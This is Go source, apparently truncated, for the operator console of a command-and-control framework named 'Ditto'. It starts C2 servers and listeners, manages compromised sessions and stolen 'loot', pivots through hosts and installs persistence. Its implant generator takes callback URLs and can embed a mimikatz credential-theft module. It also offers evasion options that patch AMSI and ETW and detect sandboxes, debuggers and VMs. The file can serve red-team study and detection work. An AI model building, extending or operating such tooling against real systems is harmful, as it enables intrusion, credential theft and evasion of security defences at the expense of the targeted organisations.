package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/banner"
	"github.com/ditto/ditto/certificates"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/database"
	"github.com/ditto/ditto/interactive"
	"github.com/ditto/ditto/jobs"
	"github.com/ditto/ditto/loot"
	"github.com/ditto/ditto/modules"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/persistence"
	"github.com/ditto/ditto/pivoting"
	"github.com/ditto/ditto/reactions"
	"github.com/ditto/ditto/tasks"
	"github.com/ditto/ditto/transport"
	"github.com/jedib0t/go-pretty/v6/table"
)

// InteractiveServer manages the interactive server CLI
type InteractiveServer struct {
	logger         *core.Logger
	config         *core.Config
	server         *transport.Server
	serverRunning  bool
	serverMu       sync.RWMutex
	jobManager     *jobs.JobManager
	sessionMgr     *core.SessionManager
	moduleRegistry *modules.ModuleRegistry
	currentSession string
	lootManager    *loot.LootManager
	pivotManager   *pivoting.PortForwardManager
	socksManager   *pivoting.SOCKS5Manager
	persistManager *persistence.Installer
	reactionMgr    *reactions.ReactionManager
	taskQueue      *tasks.Queue // Shared task queue for all components
	completer      *interactive.Completer
	input          interactive.InputReader
	syncCancel     context.CancelFunc // Context cancel function for syncSessions goroutine
}

// NewInteractiveServer creates a new interactive server
func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveServer {
	moduleRegistry := modules.NewModuleRegistry(logger)

	// Create shared task queue for all components
	sharedTaskQueue := tasks.NewQueue(1000)

	completer := interactive.NewCompleter()

	is := &InteractiveServer{
		logger:         logger,
		config:         cfg,
		jobManager:     jobs.NewJobManager(),
		sessionMgr:     core.NewSessionManager(),
		moduleRegistry: moduleRegistry,
		lootManager:    loot.NewLootManager(logger),
		pivotManager:   pivoting.NewPortForwardManager(),
		socksManager:   pivoting.NewSOCKS5Manager(),
		persistManager: nil, // Created per-installation
		reactionMgr:    reactions.NewReactionManager(logger),
		taskQueue:      sharedTaskQueue,
		completer:      completer,
	}

	// Initialize readline input (fallback to simple input if readline fails)
	rlInput, err := interactive.NewReadlineInputWithCompleter("[ditto] > ", completer)
	if err != nil {
		logger.Warn("Failed to initialize readline, using simple input: %v", err)
		is.input = interactive.NewFallbackInput("[ditto] > ")
	} else {
		is.input = rlInput
	}

	// Restore listener jobs from database
	is.restoreListenerJobs()

	return is
}

func (is *InteractiveServer) restoreListenerJobs() {
	listenerJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to restore listener jobs: %v", err)
		return
	}

	for _, dbJob := range listenerJobs {
		if dbJob.Status == "running" {
			is.logger.Info("Found persistent listener job: %s (%s:%d)", dbJob.Type, dbJob.Host, dbJob.Port)
			// Note: We can't restore the actual listener without the StopFunc
			// This is logged for visibility but listener would need to be manually restarted
			// This matches Sliver's behavior - jobs are restored but listeners need manual restart
		}
	}
}

// Run starts the interactive server CLI
func (is *InteractiveServer) Run() {
	defer func() {
		if is.input != nil {
			is.input.Close()
		}
	}()

	banner.PrintDittoBanner()
	fmt.Println("Ditto Interactive Server")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()

		for {
			// Update prompt based on current session
			prompt := getPrompt(is.currentSession)
			if is.input == nil {
				fmt.Printf("[!] Error: input handler not initialized\n")
				break
			}

			is.input.SetPrompt(prompt)

		line, err := is.input.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("[!] Error reading input: %v\n", err)
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		// Normalize command to lowercase for consistent matching
		command = strings.ToLower(command)

		// Validate command before executing (with visual feedback)
		if is.completer == nil || !is.completer.IsValidCommand(command) {
			fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", command)
			continue
		}

		// Visual feedback: highlight valid command (optional - can be enabled for verbose mode)
		// For now, we validate silently, but the completer provides tab completion hints

		if err := is.handleCommand(command, args); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
	}
}

func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "h", "?":
		is.printHelp()
	case "server", "srv", "s":
		return is.handleServer(args)
	case "stop-server", "stop":
		return is.handleStopServer()
	case "jobs", "j":
		is.printJobs()
	case "kill", "k":
		return is.handleKill(args)
	case "generate", "gen", "g":
		return is.handleGenerate(args)
	case "sessions", "sess":
		is.printSessions()
	case "use", "u":
		return is.handleUse(args)
	case "listen", "l":
		return is.handleListen(args)
	case "port-forward", "pf":
		return is.handlePortForward(args)
	case "socks5":
		return is.handleSOCKS5(args)
	case "loot":
		return is.handleLoot(args)
	case "persist":
		return is.handlePersistence(args)
	case "implants":
		return is.handleImplants(args)
	case "implant", "get-implant":
		return is.handleGetImplant(args)
	case "version", "v":
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
		banner.PrintDittoBanner()
	case "modules":
		allModules := is.moduleRegistry.ListAllModules()
		if len(allModules) == 0 {
			fmt.Println("[*] No modules loaded")
			fmt.Println("    Modules are loaded automatically from modules/ directory")
			return nil
		}

		fmt.Printf("[*] Available modules (%d total):\n\n", len(allModules))

		// Group by category
		byCategory := make(map[string][]*modules.EmpireModule)
		for _, mod := range allModules {
			category := string(mod.Category)
			byCategory[category] = append(byCategory[category], mod)
		}

		// Display grouped by category
		for category, mods := range byCategory {
			fmt.Printf("  %s:\n", category)
			for _, mod := range mods {
				fmt.Printf("    %s - %s\n", mod.ID, mod.Name)
			}
			fmt.Println()
		}

		fmt.Println("[*] Use 'module <id>' in a session to execute a module")
	case "sync-sessions":
		is.syncSessions()
		fmt.Println("[+] Sessions synced from server")
	case "exit", "quit", "q":
		if is.isServerRunning() {
			return fmt.Errorf("server is running - stop it first with 'stop-server' or 'server stop'\n" +
				"  Usage: server stop\n" +
				"  Note: You cannot exit while the server is running")
		}
		fmt.Println("Exiting Ditto...")
		os.Exit(0)
	default:
		fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", cmd)
	}
	return nil
}

func (is *InteractiveServer) printHelp() {
	help := `
Available Commands:
  Server Management:
    server, srv, s                  Start C2 server with default address (0.0.0.0:8443)
    server <addr>                   Start C2 server with specified address
    server start                   Start C2 server with default address
    server start <addr>            Start C2 server with specified address
    server stop                     Stop the running server
    server status                   Show server status
    stop-server, stop               Stop the running server (alias)
    
  Jobs & Listeners:
    jobs, j                         List all active jobs/listeners
    listen, l <type> <addr>         Start a listener (http, https, mtls)
                                    Example: listen http 0.0.0.0:8080
    kill, k <job_id>                Stop a job by ID
    
  Pivoting:
    port-forward, pf                Create port forward through session
                                    Usage: port-forward <session_id> <local> <remote>
    socks5                          Start SOCKS5 proxy through session
                                    Usage: socks5 <session_id> <bind_addr> [user] [pass]
    
  Loot Management:
    loot list                       List all loot items
    loot add <type> <name> <data>   Add loot item
    loot get <id>                   Get loot item details
    loot remove <id>                Remove loot item
    loot export                     Export all loot as JSON
    
  Persistence:
    persist install <session>       Install persistence on session
    persist remove <session>        Remove persistence from session
    
  Implants:
    implants                        List all saved implant builds
    implant <id>                    Get implant build details by ID
    
         Implant Generation:
           generate, gen, g              Generate implant
                                         Usage: generate <type> <os> <arch> [options]
                                         Options:
                                           --callback, -c <url>     Callback URL (http://host:port)
                                           --delay, -d <sec>        Beacon delay (default: 30)
                                           --jitter, -j <0.0-1.0>   Jitter percentage
                                           --output, -o <path>      Output file path
                                         Example: generate full windows amd64 --callback http://192.168.1.100:8443
                               
  Session Management:
    sessions, sess                  List all active sessions
    use, u <session_id>            Interact with a session
    
  Utilities:
    version, v                      Show version information
    clear, cls                      Clear screen
    exit, quit, q                  Exit Ditto
`
	fmt.Println(help)
}

func (is *InteractiveServer) handleServer(args []string) error {
	// Handle subcommands
	if len(args) > 0 {
		subcommand := args[0]
		switch subcommand {
		case "start":
			// server start [address]
			listenAddr := "0.0.0.0:8443"
			if len(args) > 1 {
				listenAddr = args[1]
			}
			return is.startServer(listenAddr)
		case "stop":
			return is.handleStopServer()
		case "status", "info":
			return is.handleServerStatus()
		default:
			// If it's not a subcommand, treat as address
			// Check if it looks like an address (contains :)
			if strings.Contains(subcommand, ":") {
				return is.startServer(subcommand)
			}
			// Otherwise, show help
			return fmt.Errorf("unknown server subcommand '%s'\n"+
				"  Usage:\n"+
				"    server                    Start server with default address (0.0.0.0:8443)\n"+
				"    server <address>          Start server with specified address\n"+
				"    server start              Start server with default address\n"+
				"    server start <address>    Start server with specified address\n"+
				"    server stop               Stop the running server\n"+
				"    server status             Show server status\n"+
				"  Examples:\n"+
				"    server\n"+
				"    server 0.0.0.0:8443\n"+
				"    server start\n"+
				"    server start 127.0.0.1:8080\n"+
				"    server stop\n"+
				"    server status", subcommand)
		}
	}

	// No arguments - start with default address
	return is.startServer("0.0.0.0:8443")
}

// startServer starts the C2 server with the given address
func (is *InteractiveServer) startServer(listenAddr string) error {
	if is.isServerRunning() {
		return fmt.Errorf("server is already running\n" +
			"  Use 'server stop' to stop the current server\n" +
			"  Use 'server status' to check server status")
	}

	// Validate address format
	if err := validateAddress(listenAddr); err != nil {
		return fmt.Errorf("invalid server address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080, localhost:443\n"+
			"  Note: Port must be between 1 and 65535", listenAddr, err)
	}

	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)

	is.server = transport.NewServerWithTaskQueue(is.config, is.logger, is.taskQueue)

	// Channel to track server startup errors
	startupErr := make(chan error, 1)

	// Start server in background
	go func() {
		is.setServerRunning(true)
		if err := is.server.Start(listenAddr); err != nil {
			is.setServerRunning(false)
			startupErr <- err
			return
		}
		// Server stopped normally
		is.setServerRunning(false)
		startupErr <- nil
	}()

	// Sync server sessions periodically
	// Cancel any existing sync goroutine first
	if is.syncCancel != nil {
		is.syncCancel()
		is.syncCancel = nil
	}
	ctx, cancel := context.WithCancel(context.Background())
	is.syncCancel = cancel
	go is.syncSessionsWithContext(ctx)

	// Give server time to start and check for immediate errors
	select {
	case err := <-startupErr:
		if err != nil {
			is.setServerRunning(false)
			return fmt.Errorf("server failed to start: %w", err)
		}
		// Server stopped before we could check (shouldn't happen)
		return fmt.Errorf("server stopped unexpectedly")
	case <-time.After(500 * time.Millisecond):
		// Server appears to be running (no immediate error)
		if !is.isServerRunning() {
			return fmt.Errorf("server failed to start")
		}
		fmt.Printf("[+] Server started successfully on %s\n", listenAddr)
		fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")
		return nil
	}
}

// handleServerStatus shows the current server status
func (is *InteractiveServer) handleServerStatus() error {
	if !is.isServerRunning() {
		fmt.Println("[*] Server status: NOT RUNNING")
		return nil
	}

	fmt.Println("[*] Server status: RUNNING")
	if is.server == nil {
		fmt.Println("[!] Warning: Server marked as running but server instance is nil")
		return nil
	}
	
	// Try to get server address from config or server
	fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")

	// Show session count
	sessions := is.server.GetSessions()
	fmt.Printf("[*] Active sessions: %d\n", len(sessions))

	return nil
}

func (is *InteractiveServer) handleStopServer() error {
	if !is.isServerRunning() {
		return fmt.Errorf("server is not running\n" +
			"  Use 'server start' or 'server <address>' to start the server\n" +
			"  Use 'server status' to check server status")
	}

	fmt.Println("[*] Stopping server...")

	// Stop sync goroutine
	if is.syncCancel != nil {
		is.syncCancel()
		is.syncCancel = nil
	}

	// Stop the server
	if is.server != nil {
		if err := is.server.Stop(); err != nil {
			is.logger.Error("Error stopping server: %v", err)
		}
	}

	is.setServerRunning(false)

	// Stop all listeners
	for _, job := range is.jobManager.ListJobs() {
		if job.Type == jobs.JobTypeListener {
			is.jobManager.StopJob(job.ID)
		}
	}

	fmt.Println("[+] Server stopped")
	return nil
}

func (is *InteractiveServer) handleListen(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: listen <type> <addr>\n" +
			"  Valid types: http, https, mtls\n" +
			"  Example: listen http 0.0.0.0:8080\n" +
			"  Example: listen https 0.0.0.0:8443\n" +
			"  Example: listen mtls 0.0.0.0:9090")
	}

	listenerType := strings.ToLower(args[0])
	addr := args[1]

	// Validate listener type
	validTypes := map[string]bool{"http": true, "https": true, "mtls": true}
	if !validTypes[listenerType] {
		return fmt.Errorf("invalid listener type '%s'\n"+
			"  Valid types: http, https, mtls\n"+
			"  Usage: listen <type> <address>\n"+
			"  Examples:\n"+
			"    listen http 0.0.0.0:8080\n"+
			"    listen https 0.0.0.0:8443\n"+
			"    listen mtls 0.0.0.0:9090", listenerType)
	}

	// Validate address format
	if err := validateAddress(addr); err != nil {
		return fmt.Errorf("invalid listener address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8080, 127.0.0.1:8443\n"+
			"  Note: Port must be between 1 and 65535", addr, err)
	}

	// Ensure server is running
	if !is.isServerRunning() {
		return fmt.Errorf("server is not running - you must start the C2 server first\n" +
			"  Usage: server [<address>]\n" +
			"  Example: server 0.0.0.0:8443\n" +
			"  Note: The server must be running before you can start listeners")
	}

	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)

	var stopFunc func() error

	switch listenerType {
	case "http":
		stopFunc = is.startHTTPListener(addr, jobName)
	case "https":
		stopFunc = is.startHTTPSListener(addr, jobName)
	case "mtls":
		stopFunc = is.startMTLSListener(addr, jobName)
	default:
		return fmt.Errorf("unknown listener type: %s", listenerType)
	}

	if stopFunc == nil {
		return fmt.Errorf("failed to start %s listener on %s\n"+
			"  Possible causes:\n"+
			"    - Port already in use\n"+
			"    - Insufficient permissions\n"+
			"    - Certificate issues (for https/mtls)\n"+
			"  Check server logs for details", listenerType, addr)
	}

	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, stopFunc)
	job.Metadata["type"] = listenerType
	job.Metadata["addr"] = addr

	// Persist listener job to database
	if err := is.saveListenerJobToDB(job, listenerType, addr); err != nil {
		is.logger.Error("Failed to save listener job to database: %v", err)
		// Continue anyway - job is still active
	}

	fmt.Printf("[+] Started %s (Job ID: %d)\n", jobName, job.ID)
	return nil
}

func (is *InteractiveServer) saveListenerJobToDB(job *jobs.Job, listenerType, addr string) error {
	// Parse address
	host, portStr := "", uint32(0)
	if parts := strings.Split(addr, ":"); len(parts) == 2 {
		host = parts[0]
		if p, err := strconv.ParseUint(parts[1], 10, 32); err == nil {
			portStr = uint32(p)
		}
	}

	listenerJob := &database.ListenerJob{
		JobID:    uint64(job.ID),
		Type:     listenerType,
		Host:     host,
		Port:     portStr,
		Secure:   listenerType == "https" || listenerType == "mtls",
		CertPath: is.config.Server.TLSCertPath,
		KeyPath:  is.config.Server.TLSKeyPath,
		Status:   "running",
	}

	if err := database.SaveListenerJob(listenerJob); err != nil {
		return fmt.Errorf("failed to save listener job to database: %w\n"+
			"  Note: Listener may still be running, but state won't persist", err)
	}

	return nil
}

func (is *InteractiveServer) startHTTPListener(addr, jobName string) func() error {
	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   false,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTP listener: %v", err)
		return nil // Return nil func to indicate failure
	}

	return func() error {
		is.logger.Info("Stopping HTTP listener: %s", jobName)
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startHTTPSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath

	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}

	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)

		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}

		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}

		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}

		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}

		is.logger.Info("Certificates generated successfully")
	}

	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTPS listener: %v", err)
		return nil
	}

	return func() error {
		is.logger.Info("Stopping HTTPS listener: %s", jobName)
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startMTLSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath

	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}

	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)

		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}

		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}

		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}

		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}

		is.logger.Info("Certificates generated successfully")
	}

	mtlsTransport := transport.NewmTLSTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	mtlsTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}

	ctx := context.Background()
	if err := mtlsTransport.Start(ctx, mtlsTransportConfig); err != nil {
		is.logger.Error("Failed to start mTLS listener: %v", err)
		return nil
	}

	return func() error {
		is.logger.Info("Stopping mTLS listener: %s", jobName)
		return mtlsTransport.Stop()
	}
}

func (is *InteractiveServer) handleKill(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: kill <job_id>\n" +
			"  Use 'jobs' command to list all active jobs with their IDs\n" +
			"  Example: kill 1")
	}

	jobID, err := strconv.ParseUint(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid job ID '%s': must be a number\n"+
			"  Usage: kill <job_id>\n"+
			"  Use 'jobs' command to list all active jobs with their IDs", args[0])
	}

	if err := is.jobManager.StopJob(jobID); err != nil {
		return fmt.Errorf("failed to stop job: %w", err)
	}

	// Remove from database
	if err := database.DeleteJob(jobID); err != nil {
		is.logger.Error("Failed to delete job from database: %v", err)
		// Continue anyway
	}

	fmt.Printf("[+] Stopped job %d\n", jobID)
	return nil
}

func (is *InteractiveServer) handleGenerate(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: generate <type> <os> <arch> [options]\n" +
			"  Types: stager, shellcode, full\n" +
			"  OS: linux, windows, darwin\n" +
			"  Arch: amd64, 386, arm64\n" +
			"  Options:\n" +
			"    --output, -o <path>      Output file path\n" +
			"    --callback, -c <url>     Callback URL (http://host:port or https://host:port)\n" +
			"    --delay, -d <seconds>    Beacon delay in seconds (default: 30)\n" +
			"    --jitter, -j <0.0-1.0>   Jitter percentage (default: 0.0)\n" +
			"    --user-agent, -u <ua>    Custom user agent string\n" +
			"    --protocol, -p <proto>   Protocol: http, https, mtls (default: http)\n" +
			"    --no-encrypt            Disable encryption\n" +
			"    --no-obfuscate          Disable obfuscation\n" +
			"    --modules, -m <ids>      Comma-separated Empire module IDs to embed\n" +
			"    --evasion <options>      Evasion features (comma-separated)\n" +
			"                             Options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
			"  Examples:\n" +
			"    generate full windows amd64 --callback http://192.168.1.100:8443\n" +
			"    generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443\n" +
			"    generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3\n" +
			"    generate full windows amd64 -c http://192.168.1.100:8443 --modules powershell/credentials/mimikatz\n" +
			"    generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm")
	}

	payloadType := strings.ToLower(args[0])
	osTarget := strings.ToLower(args[1])
	arch := strings.ToLower(args[2])

	// Validate payload type
	validTypes := map[string]bool{"stager": true, "shellcode": true, "full": true}
	if !validTypes[payloadType] {
		return fmt.Errorf("invalid payload type '%s'\n"+
			"  Valid types: stager, shellcode, full\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[0])
	}

	// Validate OS
	validOS := map[string]bool{"linux": true, "windows": true, "darwin": true}
	if !validOS[osTarget] {
		return fmt.Errorf("invalid OS '%s'\n"+
			"  Valid OS: linux, windows, darwin\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[1])
	}

	// Validate architecture
	validArch := map[string]bool{"amd64": true, "386": true, "arm64": true}
	if !validArch[arch] {
		return fmt.Errorf("invalid architecture '%s'\n"+
			"  Valid architectures: amd64, 386, arm64\n"+
			"  Usage: generate <type> <os> <arch> [options]\n"+
			"  Example: generate full windows amd64 --callback http://192.168.1.100:8443", args[2])
	}

	// Parse flags
	var outputPath string
	var callbackURL string
	var delay int
	var jitter float64
	var userAgent string
	var protocol string
	var modulesStr string
	var evasionStr string
	encrypt := true
	obfuscate := true

	for i := 3; i < len(args); i++ {
		switch args[i] {
		case "--output", "-o":
			if i+1 < len(args) {
				outputPath = args[i+1]
				if outputPath == "" {
					return fmt.Errorf("output path cannot be empty\n" +
						"  Usage: --output <path>\n" +
						"  Example: --output /tmp/implant.exe")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --output flag\n" +
					"  Usage: --output <path>\n" +
					"  Example: --output /tmp/implant.exe")
			}
		case "--callback", "-c":
			if i+1 < len(args) {
				callbackURL = args[i+1]
				// Validate callback URL format
				if err := validateCallbackURL(callbackURL); err != nil {
					return fmt.Errorf("invalid callback URL '%s': %w\n"+
						"  Expected format: <protocol>://<host>[:<port>]\n"+
						"  Valid protocols: http, https\n"+
						"  Examples:\n"+
						"    http://192.168.1.100:8443\n"+
						"    https://example.com:443\n"+
						"    http://c2.example.com\n"+
						"  Note: Port must be between 1 and 65535 if specified", callbackURL, err)
				}
				i++
			}
		case "--delay", "-d":
			if i+1 < len(args) {
				if _, err := fmt.Sscanf(args[i+1], "%d", &delay); err != nil {
					return fmt.Errorf("invalid delay value '%s': must be a number\n"+
						"  Usage: --delay <seconds>\n"+
						"  Example: --delay 60", args[i+1])
				}
				if delay < 0 {
					return fmt.Errorf("delay must be >= 0, got %d", delay)
				}
				i++
			} else {
				return fmt.Errorf("missing value for --delay flag\n" +
					"  Usage: --delay <seconds>\n" +
					"  Example: --delay 60")
			}
		case "--jitter", "-j":
			if i+1 < len(args) {
				if _, err := fmt.Sscanf(args[i+1], "%f", &jitter); err != nil {
					return fmt.Errorf("invalid jitter value '%s': must be a number\n"+
						"  Usage: --jitter <0.0-1.0>\n"+
						"  Example: --jitter 0.3", args[i+1])
				}
				if jitter < 0 || jitter > 1 {
					return fmt.Errorf("jitter must be between 0.0 and 1.0, got %.2f", jitter)
				}
				i++
			} else {
				return fmt.Errorf("missing value for --jitter flag\n" +
					"  Usage: --jitter <0.0-1.0>\n" +
					"  Example: --jitter 0.3")
			}
		case "--user-agent", "-u":
			if i+1 < len(args) {
				userAgent = args[i+1]
				if userAgent == "" {
					return fmt.Errorf("user agent cannot be empty\n" +
						"  Usage: --user-agent <string>\n" +
						"  Example: --user-agent 'Mozilla/5.0'")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --user-agent flag\n" +
					"  Usage: --user-agent <string>\n" +
					"  Example: --user-agent 'Mozilla/5.0'")
			}
		case "--protocol", "-p":
			if i+1 < len(args) {
				protocol = strings.ToLower(args[i+1])
				validProtocols := map[string]bool{"http": true, "https": true, "mtls": true}
				if !validProtocols[protocol] {
					return fmt.Errorf("invalid protocol '%s'\n"+
						"  Valid protocols: http, https, mtls\n"+
						"  Usage: --protocol <protocol>\n"+
						"  Example: --protocol https", args[i+1])
				}
				i++
			} else {
				return fmt.Errorf("missing value for --protocol flag\n" +
					"  Usage: --protocol <http|https|mtls>\n" +
					"  Example: --protocol https")
			}
		case "--modules", "-m":
			if i+1 < len(args) {
				modulesStr = args[i+1]
				if modulesStr == "" {
					return fmt.Errorf("modules list cannot be empty\n" +
						"  Usage: --modules <id1,id2,...>\n" +
						"  Example: --modules powershell/credentials/mimikatz")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --modules flag\n" +
					"  Usage: --modules <id1,id2,...>\n" +
					"  Example: --modules powershell/credentials/mimikatz")
			}
		case "--evasion":
			if i+1 < len(args) {
				evasionStr = args[i+1]
				if evasionStr == "" {
					return fmt.Errorf("evasion options cannot be empty\n" +
						"  Usage: --evasion <option1,option2,...>\n" +
						"  Valid options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
						"  Example: --evasion sandbox,debugger,vm")
				}
				i++
			} else {
				return fmt.Errorf("missing value for --evasion flag\n" +
					"  Usage: --evasion <option1,option2,...>\n" +
					"  Valid options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls\n" +
					"  Example: --evasion sandbox,debugger,vm")
			}
		case "--no-encrypt":
			encrypt = false
		case "--no-obfuscate":
			obfuscate = false
		}
	}

	// Parse modules
	var modules []string
	if modulesStr != "" {
		modules = strings.Split(modulesStr, ",")
		// Trim whitespace
		for i, m := range modules {
			modules[i] = strings.TrimSpace(m)
		}
	}

	// Parse evasion options
	var evasion *payload.EvasionConfig
	if evasionStr != "" {
		evasion = &payload.EvasionConfig{}
		evasionOptions := strings.Split(evasionStr, ",")
		for _, opt := range evasionOptions {
			switch strings.TrimSpace(strings.ToLower(opt)) {
			case "sandbox":
				evasion.EnableSandboxDetection = true
			case "debugger":
				evasion.EnableDebuggerCheck = true
			case "vm":
				evasion.EnableVMDetection = true
			case "etw":
				evasion.EnableETWPatches = true
			case "amsi":
				evasion.EnableAMSI = true
			case "sleepmask":
				evasion.SleepMask = true
			case "syscalls":
				evasion.DirectSyscalls = true
			}
		}
	}

	// Set default output path if not provided
	if outputPath == "" {
		outputDir := "./implants"
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			return fmt.Errorf("failed to create default output directory '%s': %w\n"+
				"  Solution: Check directory permissions or specify a different path with --output", outputDir, err)
		}

		ext := ".bin"
		if osTarget == "windows" {
			ext = ".exe"
		}

		outputPath = filepath.Join(outputDir, fmt.Sprintf("implant_%s_%s_%s_%d%s",
			payloadType, osTarget, arch, time.Now().Unix(), ext))
	}

	fmt.Printf("[*] Generating %s payload for %s/%s...\n", payloadType, osTarget, arch)
	if callbackURL != "" {
		fmt.Printf("[*] Callback URL: %s\n", callbackURL)
	}
	if delay > 0 {
		fmt.Printf("[*] Delay: %d seconds\n", delay)
	}
	if jitter > 0 {
		fmt.Printf("[*] Jitter: %.1f%%\n", jitter*100)
	}
	fmt.Printf("[*] Output: %s\n", outputPath)

	options := payload.Options{
		Type:        payloadType,
		Arch:        arch,
		OS:          osTarget,
		Encrypt:     encrypt,
		Obfuscate:   obfuscate,
		Config:      is.config,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		Modules:     modules,
		Evasion:     evasion,
	}

	gen := payload.NewGenerator(is.logger, is.moduleRegistry)
	data, err := gen.Generate(options)
	if err != nil {
		return fmt.Errorf("generation failed: %w", err)
	}

	// Ensure output directory exists
	outputDir := filepath.Dir(outputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	if err := os.WriteFile(outputPath, data, 0755); err != nil {
